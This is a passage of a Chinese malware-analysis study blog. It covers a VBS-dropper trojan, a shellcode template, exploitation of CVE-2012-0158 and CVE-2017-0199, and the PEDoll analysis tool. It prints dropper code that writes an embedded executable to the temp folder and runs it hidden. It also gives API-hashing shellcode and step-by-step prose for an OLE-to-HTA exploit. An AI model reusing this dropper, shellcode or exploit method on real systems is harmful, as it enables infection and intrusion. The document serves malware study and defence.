&quot;4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000504500004C010300BC7CB1470000000000000000E0000F010B01070400E000000010000000E0010030C0020000F0010000D002000000400000100000000200000A00000008000100040000000000000000E002000010000000000000020000000000100000100000000010000010000000000000100000000000000000000000E8D402001001000000D00200E80400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000E00100001000000000000000040000000000000000000000000000800000E0555058310000000000E0000000F0010000D2000000040000000000000000000000000000400000E02E727372630000000010000000D002000006000000D60000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303300555058210D09020838ADBE177792F93FD0A0020023D000000048010026000012B29FA89200FF253</span><br><span class=\"line\">Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class=\"line\">DropPath = FSO.GetSpecialFolder(2) &amp; &quot;\\&quot; &amp; DropFileName</span><br><span class=\"line\">If FSO.FileExists(DropPath)=False Then</span><br><span class=\"line\">Set FileObj = FSO.CreateTextFile(DropPath, True)</span><br><span class=\"line\">For i = 1 To Len(WriteData) Step 2</span><br><span class=\"line\">FileObj.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(WriteData,i,2)))</span><br><span class=\"line\">Next</span><br><span class=\"line\">FileObj.Close</span><br><span class=\"line\">End If</span><br><span class=\"line\">Set WSHshell = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class=\"line\">WSHshell.Run DropPath, 0</span><br><span class=\"line\">//--&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>\n<p>通过十六进制编辑器还原为 exe</p>\n<h3 id=\"基于vbs木马攻击链分析\"><a class=\"markdownIt-Anchor\" href=\"#基于vbs木马攻击链分析\">#</a> 基于 VBS 木马攻击链分析</h3>\n<p>CreateProcessW &amp;&amp; kernel32!CreateProcessInternalW 下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2535bad73dd1462dac4533d552a403e6.png\" alt=\"img\"></p>\n<ol>\n<li>\n<p>此次攻击的特点为：在投放木马时伪装成各类软件的安装包，在最终植入的木马运行时又伪装正常软件的进程名，用来下载恶意脚本代码及病毒木马的服务器是攻击者入侵后控制的某些色情和酒店网站服务器，“伪装者 “木马还会使用短链接地址、服务器校验等方法来躲避分析人员的追踪。</p>\n<p>在整个攻击过程中使用大量网民熟悉的软件名称来命名木马文件，通过攻击其他网站来下载自己的恶意程序，十分善于隐藏和伪装自身，因此我们将其命名为 “伪装者” 木马。</p>\n</li>\n</ol>\n<h3 id=\"基于恶意代码的机器学习引擎\"><a class=\"markdownIt-Anchor\" href=\"#基于恶意代码的机器学习引擎\">#</a> 基于恶意代码的机器学习引擎</h3>\n<ol>\n<li>要想检测恶意代码，首先我们必须对其进行特征提取，但是恶意代码的特征向量的维度是非常高的，在计算机中处理起来，计算速度会非常的慢，但是也不必担心，能够检测出恶意代码是否恶意，影响较大的仅仅是几个特征，为此，在进行分类学习之前我们需要对其进行数据预处理，编写这一段代码的作者，采用预先剔除无关影响的特征向量，留下影响较大的特征向量！已达到分类准确的目的，本篇博客是基于机器学习恶意代码检测之数据预处理的第四种处理方法</li>\n<li>机器学习是指，概念定义在实例集合上，这个集合表示 X</li>\n<li>待学习的概念或目标函数成为目标概念（target concept），记作 c</li>\n<li>x：每一个实例</li>\n<li>X：样例，所有实例的集合</li>\n<li>学习目标：f:X-&gt;Y</li>\n<li>简单理解：通过训练大量的样本 x 组成的样本集 X，提取样本中的规则 f，得到一个目标结果 Y</li>\n<li><strong>训练集 (training set/data)/ 训练样例 (training examples): 用来进行训练，也就是产生模型或者算法的数据集</strong></li>\n<li><strong>测试集 (testing set/data)/ 测试样例 (testing examples): 用来专门进行测试已经学习好的模型或者算法的数据集</strong></li>\n<li><strong>特征向量 (features/feature vector): 属性的集合，通常用一个向量表示，附属于一个实例。每一个样例都有自己不同的属性，不同的属性用不同的属性值代表，多个属性值组合在一起就可以用一个向量来表示。这个向量就称之为特征向量。</strong></li>\n</ol>\n<h2 id=\"文档类恶意文件\"><a class=\"markdownIt-Anchor\" href=\"#文档类恶意文件\">#</a> 文档类恶意文件</h2>\n<h3 id=\"cve-2012-0158\"><a class=\"markdownIt-Anchor\" href=\"#cve-2012-0158\">#</a> CVE-2012-0158</h3>\n<p>程序将参数传入栈中时没有检查传入的参数是否大于预定的长度，导致栈中关键数据被参数覆盖</p>\n<p>CVE-2012-0158 漏<br>\n洞发生在 MSCOMCTL.OCX 模块，在一段内存拷贝时，由于检查条件错误造成基于栈的缓冲区溢出。</p>\n<p>office 类的程序可以下断在 wineexec 和 CreateProcess</p>\n<h3 id=\"自定义payload中shellcode调试方法\"><a class=\"markdownIt-Anchor\" href=\"#自定义payload中shellcode调试方法\">#</a> 自定义 payload 中 shellcode 调试方法</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">#define EM(x) _asm _emit x</span><br><span class=\"line\">extern &quot;C&quot; int shellcode_start();</span><br><span class=\"line\"> </span><br><span class=\"line\">_declspec(naked) int shellcode_entry()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        jmp shellcode_start</span><br><span class=\"line\">        nop</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">//获取Kernel32基地址</span><br><span class=\"line\">_declspec(naked) int GetKernel32Base()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push esi</span><br><span class=\"line\">        mov esi,dword ptr fs : [0x30]//1.FS:[0x30]获取PEB</span><br><span class=\"line\">        mov esi,[esi + 0xc]//2.指向PEB_LDR_DATA结构指针</span><br><span class=\"line\">        mov esi,[esi + 0x1c]//3.模块链表指针</span><br><span class=\"line\">        mov esi,[esi]//4.获取第一个链表结构</span><br><span class=\"line\">        mov esi,[esi]//5.获取模块链表第二个条目，一般是kernel32或者kernelbase(win7以下)</span><br><span class=\"line\">        mov eax,[esi+0x8]//6.获取基址，kernel32或者kernelbase</span><br><span class=\"line\">        pop esi</span><br><span class=\"line\">        ret</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">//求字符串Hash值</span><br><span class=\"line\">_declspec(naked) int GetStringHash(const char* szString)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push ebp</span><br><span class=\"line\">        mov ebp,esp</span><br><span class=\"line\">        push esi</span><br><span class=\"line\">        push edx</span><br><span class=\"line\">        xor edx,edx</span><br><span class=\"line\">        xor eax,eax</span><br><span class=\"line\">        mov esi,[ebp+8]//获取参数，即字符串</span><br><span class=\"line\">    GetStringHash_Loop:</span><br><span class=\"line\">        lods byte ptr [esi] //获取字符串一个字节</span><br><span class=\"line\">        test al,al</span><br><span class=\"line\">        je GetStringHash_Exit//直到遇到0退出循环</span><br><span class=\"line\">        rol edx,0x3//求hash</span><br><span class=\"line\">        xor dl,al//求hash</span><br><span class=\"line\">        jmp GetStringHash_Loop</span><br><span class=\"line\">    GetStringHash_Exit:</span><br><span class=\"line\">        xchg eax,edx//将结果保存在eax</span><br><span class=\"line\">        pop edx</span><br><span class=\"line\">        pop esi</span><br><span class=\"line\">        mov esp,ebp</span><br><span class=\"line\">        pop ebp</span><br><span class=\"line\">        retn 4</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">_declspec(naked) int GetHashAndCmpHash(const char*strFunName,int nHash)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push ebp</span><br><span class=\"line\">        mov ebp,esp</span><br><span class=\"line\">        push ebx</span><br><span class=\"line\">        push edx</span><br><span class=\"line\">        mov eax,[ebp+0x8]//参数1：ebp+0x8 strFunName</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        call GetStringHash</span><br><span class=\"line\">        mov ebx,eax</span><br><span class=\"line\">        xor eax,eax</span><br><span class=\"line\">        mov edx,[ebp+0xc]//参数2 hash</span><br><span class=\"line\">        cmp ebx,edx//比较字符串的hash值</span><br><span class=\"line\">        jne GetHashAndCmpHash_End//不等返回0</span><br><span class=\"line\">        mov eax,0x1//相等返回1</span><br><span class=\"line\">    GetHashAndCmpHash_End:</span><br><span class=\"line\">        pop edx</span><br><span class=\"line\">        pop ebx</span><br><span class=\"line\">        mov esp,ebp</span><br><span class=\"line\">        pop ebp</span><br><span class=\"line\">        retn 8</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">//根据hash值 寻找指定模块的 函数地址</span><br><span class=\"line\">_declspec(naked) int GetAddrFromHash(int nHash,int nImageBase)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push ebp</span><br><span class=\"line\">        mov ebp,esp</span><br><span class=\"line\">        sub esp,0xc//申请局部空间</span><br><span class=\"line\">        push edx</span><br><span class=\"line\">        //1.获取EAT/ENT/EOT地址</span><br><span class=\"line\">        mov edx,[ebp+0xc] //imageBase</span><br><span class=\"line\">        mov esi,[edx+0x3c]//esi=IMAGE_DOS_HEADER.e_lfanew</span><br><span class=\"line\">        lea esi,[edx+esi]//pe文件头</span><br><span class=\"line\">        mov esi,[esi+0x78]//esi=IMAGE_EXPORT.VirtualAddress</span><br><span class=\"line\">        lea esi,[edx+esi]//esi=导出表首地址</span><br><span class=\"line\">        //EAT</span><br><span class=\"line\">        mov edi,[esi+0x1c]//edi=IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</span><br><span class=\"line\">        lea edi,[edx+edi]//EAT首地址</span><br><span class=\"line\">        mov [ebp-0x4],edi//EAT</span><br><span class=\"line\">        //ENT</span><br><span class=\"line\">        mov edi,[esi+0x20]//edi=IMAGE_EXPORT_DIRECTORY.AddressOfNames</span><br><span class=\"line\">        lea edi,[edx+edi]//ENT首地址</span><br><span class=\"line\">        mov [ebp-0x8],edi//ENT</span><br><span class=\"line\">        //EOT</span><br><span class=\"line\">        mov edi,[esi+0x24]//edi=IMAGE_EXPORT_DIRECTORY.AddressOfNamesOrdinals</span><br><span class=\"line\">        lea edi,[edx+edi]//EOT首地址</span><br><span class=\"line\">        mov [ebp-0xc],edi//EOT</span><br><span class=\"line\">        //2.循环对比ENT中的函数名</span><br><span class=\"line\">        xor ecx,ecx//数组下标</span><br><span class=\"line\">        jmp Loop_FirstCmp</span><br><span class=\"line\">    Loop_FunName:</span><br><span class=\"line\">        inc ecx</span><br><span class=\"line\">    Loop_FirstCmp:</span><br><span class=\"line\">        mov esi, [ebp - 0x8]//ent</span><br><span class=\"line\">        mov esi, [esi + ecx * 4]//ENT rva</span><br><span class=\"line\">        mov edx, [ebp + 0xc]//imageBase</span><br><span class=\"line\">        lea esi, [edx + esi]//ENT va(第一个函数名)</span><br><span class=\"line\">        push[ebp + 0x8]//nHash</span><br><span class=\"line\">        push esi//strFun</span><br><span class=\"line\">        call GetHashAndCmpHash</span><br><span class=\"line\">        test eax, eax</span><br><span class=\"line\">        je Loop_FunName</span><br><span class=\"line\">        //3.成功后找到对应序号</span><br><span class=\"line\">        mov esi, [ebp - 0xc]//EOT</span><br><span class=\"line\">        xor edi, edi</span><br><span class=\"line\">        mov di, [esi + ecx * 2]//取EOT[i]</span><br><span class=\"line\">        //4.在EAT中找到对应函数地址</span><br><span class=\"line\">        mov esi, [ebp - 0x4]//EAT</span><br><span class=\"line\">        mov edi, [esi + edi * 4]//EAT[EOT[i]] rva</span><br><span class=\"line\">        mov edx, [ebp + 0xc]//imageBase</span><br><span class=\"line\">        //5.返回地址</span><br><span class=\"line\">        lea eax, [edx + edi]//EAT VA函数地址</span><br><span class=\"line\">        pop edx</span><br><span class=\"line\">        mov esp,ebp</span><br><span class=\"line\">        pop ebp</span><br><span class=\"line\">        retn 8</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">_declspec(naked) int shellcode_start()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    _asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push ebp</span><br><span class=\"line\">        mov ebp,esp</span><br><span class=\"line\">        sub esp,0x30</span><br><span class=\"line\">        jmp zero_code</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        nop</span><br><span class=\"line\">        zero_code:</span><br><span class=\"line\"> </span><br><span class=\"line\">        jmp code_start</span><br><span class=\"line\">        //ebp-0x10(28) len:7&quot;user32/0&quot;</span><br><span class=\"line\">        EM(0x75) EM(0x73) EM(0x65) EM(0x72) EM(0x33) EM(0x32) EM(0x00)</span><br><span class=\"line\">        //ebp-0x0c(17) len:12&quot;Hello World/0&quot;</span><br><span class=\"line\">        EM(0x48) EM(0x65) EM(0x6C) EM(0x6C) EM(0x6F) EM(0x20) EM(0x57) EM(0x6F) EM(0x72) EM(0x6C) EM(0x64) EM(0x00)</span><br><span class=\"line\">    code_start:</span><br><span class=\"line\">        call code_pop</span><br><span class=\"line\">    code_pop:</span><br><span class=\"line\">        pop eax</span><br><span class=\"line\">        sub eax,0x18</span><br><span class=\"line\">        mov [ebp-0x2C],eax //保存user32地址</span><br><span class=\"line\">        add eax,0x7</span><br><span class=\"line\">        mov [ebp-0x28],eax//保存Hello World地址</span><br><span class=\"line\"> </span><br><span class=\"line\">        //1.获取Kernel32基地址</span><br><span class=\"line\">        call GetKernel32Base</span><br><span class=\"line\">        mov [ebp-0x24],eax</span><br><span class=\"line\">        //2.获取GetProcAddress地址</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        push 0xf2509b84</span><br><span class=\"line\">        call GetAddrFromHash</span><br><span class=\"line\">        mov [ebp-0x20],eax</span><br><span class=\"line\">        //3.获取LoadLibraryA地址</span><br><span class=\"line\">        push [ebp-0x24]</span><br><span class=\"line\">        push 0xa412fd89</span><br><span class=\"line\">        call GetAddrFromHash</span><br><span class=\"line\">        mov [ebp-0x1c],eax</span><br><span class=\"line\">        //4.获取user32基地址</span><br><span class=\"line\">        push [ebp-0x2c]</span><br><span class=\"line\">        call [ebp-0x1c]</span><br><span class=\"line\">        mov [ebp-0x18],eax</span><br><span class=\"line\">        //5.获取MessageBoxA地址</span><br><span class=\"line\">        push eax</span><br><span class=\"line\">        push 0x14d14c51</span><br><span class=\"line\">        call GetAddrFromHash</span><br><span class=\"line\">        mov [ebp-0x14],eax</span><br><span class=\"line\">        //6.调用MessageBoxA地址</span><br><span class=\"line\">        push 0</span><br><span class=\"line\">        push 0</span><br><span class=\"line\">        push [ebp-0x28]</span><br><span class=\"line\">        push 0</span><br><span class=\"line\">        call [ebp-0x14]</span><br><span class=\"line\">        //7.获取ExitProcess地址</span><br><span class=\"line\">        push [ebp-0x24]</span><br><span class=\"line\">        push 0xe6ff2cb9</span><br><span class=\"line\">        call GetAddrFromHash</span><br><span class=\"line\">        //8.调用ExitProcess</span><br><span class=\"line\">        push 0</span><br><span class=\"line\">        call eax</span><br><span class=\"line\"> </span><br><span class=\"line\">        retn</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    shellcode_entry();</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"cve-2017-0199\"><a class=\"markdownIt-Anchor\" href=\"#cve-2017-0199\">#</a> CVE-2017-0199</h3>\n<p>word 在处理内嵌 OLE2LINK 对象时，通过网络更新对象时没有正确处理的 Content-Type 所导致的逻辑漏洞。</p>\n<p>根据微软官方 MS15-33 安全公告里显示，这个漏洞覆盖 2007 SP3，2010 SP1、SP2，2013，2013 RT；Word Viewer；Office Compatibility Pack SP3；Office for Mac 2011；Word Automation Services on SharePoint Server 2010 SP1、SP2、2013；Office Web Apps 2010 SP1 and SP2；Office Web Apps Server 2013。</p>\n<p><strong>漏洞利用</strong></p>\n<ol>\n<li>word 在处理内嵌 OLE2LINK 对象时，对多媒体对象的类型没有检查。服务端返回一个 hta 类型数据被 WORD 调用 COM 接口创建 mshta.exe 直接运行。</li>\n<li>由于该漏洞是 word 逻辑漏洞，利用起来相对容易，通过在文档中点击插入对象，设置对象地址，然后选择 “链接到文件”，点击确认，这样便可以插入一个 OLE 对象。</li>\n<li>然后把服务端的 “test.rtf” 文件内容修改为一个 html 脚本文件。</li>\n<li>并且修改服务端 mime 类型，原本 “.rtf” 的 Mime 类型为 “application/rtf”，修改为 “application/rtf hta”。</li>\n<li>此时点击文档中的 ole 对象，就能运行服务器中的脚本文件。接着在编辑文档中的”objlink” 对象，增加属性”\\objupdate”，就能够让文档打开时直接触发利用 (虚拟机中很多都触发不了，2013、2016 触发比较稳定)。<br>\n<strong>四、</strong>     <strong>漏洞成因</strong></li>\n<li>Word 把远端数据下载到临时文件夹中，http 协议中的”content/type” 数据如下。</li>\n<li>然后通过 Urlmon 模块中的 “GetClassFileOrMimeinternal” 函数获取运行该文件的 com 组件 CLSID。</li>\n<li>“GetClassFileOrMimeinternal” 会优先通过”content/type” 获取 CLSID, 如果获取失败才会通过后缀名获取 CLSID。</li>\n<li>此时获取到的 CLSID 为 “3050f4d8-98b5-11cf-bb82-00aa00bdce0b”，然后调用 “CoCreateInstanceForObjectBinding” 创建一个 COM 实例，该 COM 对象就是 “mshta.exe” 程序，最后传递数据，直接 html 脚本。</li>\n<li>该漏洞的成因和利用相对简单，只需要几个操作就可以形成一个利用。最后在看一下微软修改补丁：</li>\n<li>在 “CoCreateInstanceForObjectBinding” 创建了一个 “FilterActivation” 函数，增加了一个 “g_ActivationFilter” 对象，在该函数中调用 “g_ActivationFilter” 虚表 + 12 位置的虚函数，把 CLSID 作为参数。</li>\n<li>找到 “g_ActivationFilter” 的初始化位置，该函数由 MSO 模块调用。</li>\n<li>​      MSO 模块初始化该过滤对象，该对象是一个全局对象，找到该对象的虚表，如下图。</li>\n<li>在虚表中 + 12 位置的虚函数伪代码如下，在前面调用中，第三个参数是 CLSID，说明下面两次比较应该是检查 CLSID。</li>\n<li>这两个 CLSID 经过分析后，发现为脚本对象和 hta 对象的 ID。微软通过检查 CLSID，过滤脚本对象和 HTA 对象，目前只有这两个对象，如果以后发现有新的威胁，也方便以后扩展</li>\n</ol>\n<h2 id=\"pe类恶意程序分析\"><a class=\"markdownIt-Anchor\" href=\"#pe类恶意程序分析\">#</a> PE 类恶意程序分析</h2>\n<h3 id=\"pedoll\"><a class=\"markdownIt-Anchor\" href=\"#pedoll\">#</a> PEDoll</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002132806855.png\" alt=\"image-20231002132806855\"></p>\n<p>调试机运行，控制器连接</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002132844541.png\" alt=\"image-20231002132844541\"></p>\n<p>常用脚本中为规则中加载的脚本</p>\n<p>PeDoll 是一款基于 inline Hook 的程序行为分析软件，主要包括以下功能<br>\n 1. 对关键 API 调用进行 Hook 生成报表，监视程序行为<br>\n 2. 运行时修改程序执行代码<br>\n 3. 程序的网络抓包，写入数据的 Dump<br>\n4. 软件实现的自旋锁断点，方便与 OllyDbg 联合调试<br>\n 5. 分析目标程序的内存，分析栈数据实现破解.<br>\nPeDoll 主要面向逆向分析初学者或者是具有一定编程逆向基础的 Cracker, 旨在简化逆向分析工作，可以在一定程度上对一些具有反逆向功能的恶意程序 (加壳，加花，反调试器) 简化分析难度或实现自动化分析<br>\n PeDoll 是基于简单脚本 (命令) 控制的行为分析软件，通过对不同的程序编写不同的脚本实现特定的分析，同时 PeDoll 是一款远程分析调试器，这也意味着在对恶意程序分析中控制端和调试端分开进行是被建议的</p>\n<p>其运行原理如下所示<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/cd7110364ceb4c23ba9411c5a0320104.png\" alt=\"img\"></p>\n<p>命令：doll db &lt;D:\\Sample1.exe&gt;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002134450857.png\" alt=\"image-20231002134450857\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002135648446.png\" alt=\"image-20231002135648446\"></p>\n<p>会更改函数头前五个字节</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002135943900.png\" alt=\"image-20231002135943900\"></p>\n<p>会在 exe 中加载自己的 dll</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003174400974.png\" alt=\"image-20231003174400974\"></p>\n<h3 id=\"pedoll-源码分析\"><a class=\"markdownIt-Anchor\" href=\"#pedoll-源码分析\">#</a> PEDoll 源码分析</h3>\n<p><span class=\"exturl\" 